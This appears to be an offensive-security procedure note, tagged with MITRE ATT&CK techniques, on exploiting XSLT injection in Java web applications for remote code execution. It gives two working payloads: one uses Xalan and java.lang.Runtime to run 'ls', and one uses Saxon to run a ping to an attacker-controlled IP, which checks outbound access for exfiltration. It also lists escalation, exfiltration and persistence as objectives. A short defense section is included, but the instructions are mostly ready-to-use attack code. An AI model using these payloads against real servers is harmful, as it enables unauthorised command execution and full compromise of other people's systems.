---
id: b1cdb361-981a-428f-aa67-57c7d7e69e26
name: XSLT-Injection-for-Java-RCE
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.584235+00:00'
updated_at: '2023-04-10T20:24:51.113173+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/Signed Binary Proxy Execution|T1218 - Signed Binary Proxy
    Execution]]
sub_techniques: []
tags:
  - '[[tags/Exploit]]'
  - '[[tags/Remote Code Execution with Java]]'
  - '[[tags/XSLT Injection]]'
commands: []
platforms:
  - Web
  - Java
tools: []
validated: true
---

# XSLT-Injection-for-Java-RCE

## Summary

This procedure demonstrates how to exploit an XSLT Injection vulnerability in a Java-based web application to achieve remote code execution (RCE). By injecting malicious XSLT code, an attacker can leverage Java's Runtime class to execute system commands, such as listing directory contents or performing network pings, on the server.

## Description

XSLT Injection targets web applications that process user-supplied input through an XSLT processor without proper sanitization. In Java environments using processors like Xalan or Saxon, attackers can inject XSLT namespaces and templates that invoke Java classes, such as java.lang.Runtime, to execute arbitrary commands. This procedure focuses on two example payloads: one to list files in the current directory (using 'ls' on Unix-like systems) and another to execute a ping command (on Windows systems). The attack exploits the trust in XSLT transformations to run server-side code, potentially leading to full server compromise. It requires a vulnerable endpoint that accepts and processes XML/XSLT input, such as an XML transformation service.

## Requirements

1. Access to a web application vulnerable to XSLT Injection, typically via a user-controlled input field that feeds into an XSLT processor (e.g., a search or report generation feature).
2. Knowledge of the target's Java XSLT processor (Xalan for the file listing payload, Saxon for the ping payload).
3. Network access to the target application, often over HTTP/HTTPS.
4. A tool like Burp Suite or curl to send crafted POST requests with the malicious XSLT payload.
5. Basic understanding of XML and XSLT syntax to adapt payloads if needed.

## Defense

- Implement strict input validation and sanitization for all XML/XSLT inputs, disallowing custom namespaces and external entity references.
- Use a secure XSLT processor configuration that disables Java extensions and limits document() functions.
- Deploy a Web Application Firewall (WAF) to detect anomalous XSLT patterns, such as unexpected Java class invocations.
- Regularly audit and patch Java libraries and web frameworks for known XSLT processing vulnerabilities.
- Enable logging for XSLT transformations and monitor for unusual command executions on the server.

## Objectives

1. Inject malicious XSLT to execute arbitrary Java code on the server.
2. Verify RCE by listing files or performing network operations.
3. Escalate to full server control for data exfiltration or persistence.
4. Demonstrate the vulnerability for reporting or remediation.

## Instructions

### Step 1: Inject XSLT Payload to List Directory Files

**Context**: This step uses an XSLT injection payload to execute the 'ls' command via Java's Runtime.exec, revealing the server's directory structure and confirming RCE. Target an endpoint that processes XML input with XSLT, such as a transformation API. Use a proxy tool to intercept and modify requests.

**Code** ([[codes/XSLT-List-Files-via-Java-Runtime]]):

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```

> Submit this payload as the XSLT stylesheet in a POST request to the vulnerable endpoint. The processor will execute 'ls' and return the output as transformed XML content. If the target is Windows, replace 'ls' with 'dir'.

### Step 2: Inject XSLT Payload to Execute Ping Command

**Context**: This step tests network connectivity or exfiltration by pinging a controlled IP address using the 'ping' command via Java's Runtime.exec. It confirms outbound access from the server and can be adapted for more destructive actions.

**Code** ([[codes/XSLT-Ping-Command-via-Java-Runtime]]):

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

> Replace 'IP' in the payload with your controlled IP (e.g., '8.8.8.8' for testing). Submit via POST to the XSLT endpoint. Monitor your listener for the ping response to confirm execution. On Unix-like systems, adapt to '/bin/ping -c 1 IP'.
